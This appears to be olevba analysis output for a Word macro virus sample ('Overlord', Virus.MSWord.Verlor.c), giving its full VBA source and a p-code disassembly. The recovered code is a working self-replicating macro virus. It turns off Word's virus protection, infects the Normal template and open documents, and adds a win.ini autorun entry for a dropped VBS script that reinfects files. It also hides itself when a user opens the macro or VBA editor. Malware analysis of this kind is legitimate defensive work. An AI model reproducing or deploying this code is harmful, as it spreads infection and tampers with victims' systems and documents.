olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Verlor.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Verlor.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: ./Virus.MSWord.Verlor.c - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Module").CodeModule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("Module")
Documents(X).Saved = True
Next X
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For X = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(Y, 1) & Chr(13)
 Next Y
 For X = 1 To Docnumber
 Documents(X).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Module").CodeModule.CountOfLines
 Documents(X).Saved = True
 Next X
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
Next X
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Verlor.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Module - 10177 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0011 "MyName = Overlord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "WrittenBy = f0re [UC/Skamwerks/DVC]"
' Line #4:
' 	QuoteRem 0x0000 0x0012 "Version = .B (1.1)"
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #9:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #10:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' Line #16:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #19:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #22:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitStr 0x000C "c:\Himem.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #29:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #30:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld Like 
' 	InputItem 
' 	InputDone 
' Line #32:
' 	Ld Like 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' 	EndIf 
' Line #33:
' 	Loop 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' Line #37:
' 	LitStr 0x000C "c:\Himem.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #38:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsCall FileCopy 0x0002 
' Line #39:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub Stealth())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' Line #47:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #48:
' Line #49:
' 	LitStr 0x000C "the Overlord"
' 	LitStr 0x0000 ""
' 	LitStr 0x001C "HKEY_LOCAL_MACHINE\software\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #50:
' Line #51:
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #52:
' 	LitStr 0x000A "c:\win._ni"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #53:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #55:
' 	Ld Like 
' 	LitStr 0x0009 "[windows]"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "run = "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	PrintItemNL 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Loop 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #63:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #64:
' Line #65:
' 	LitStr 0x000A "c:\win._ni"
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	ArgsCall FileCopy 0x0002 
' Line #66:
' 	LitStr 0x000A "c:\win._ni"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #67:
' Line #68:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #69:
' Line #70:
' 	LitStr 0x0019 "c:\windows\overlord.b.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Set WordObj = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "WordObj.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Module"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "WordObj.NormalTemplate.VBProject.VBComponents.import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Dim FSO"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Set FSO = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "contents = a.readall()"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set b =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 2, True)"
' 	Concat 
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "b.write(contents)"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "b.close"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Do While a.atendofstream <> True"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "documentname = a.readline"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If documentname <> "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "WordObj.Documents.open (documentname)"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.activedocument.save"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "WordObj.activedocument.close"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End if"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Loop"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "set NT = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "WordObj.Quit"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #103:
' Line #104:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #105:
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub ViewVBCode())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' Line #110:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #111:
' Line #112:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #113:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #114:
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #115:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #116:
' Line #117:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St Docnumber 
' Line #118:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #119:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #120:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #121:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #122:
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #123:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #124:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	EndIfBlock 
' Line #126:
' Line #127:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #128:
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Sub ToolsMacro())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' Line #133:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #134:
' 	Ld codeNT 
' 	Ld X 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St codeNT 
' Line #135:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #136:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #137:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #138:
' Line #139:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St Docnumber 
' Line #140:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #141:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #142:
' 	Ld CodeAD 
' 	Ld Y 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeAD 
' Line #143:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #145:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #146:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #147:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	EndIfBlock 
' Line #149:
' Line #150:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
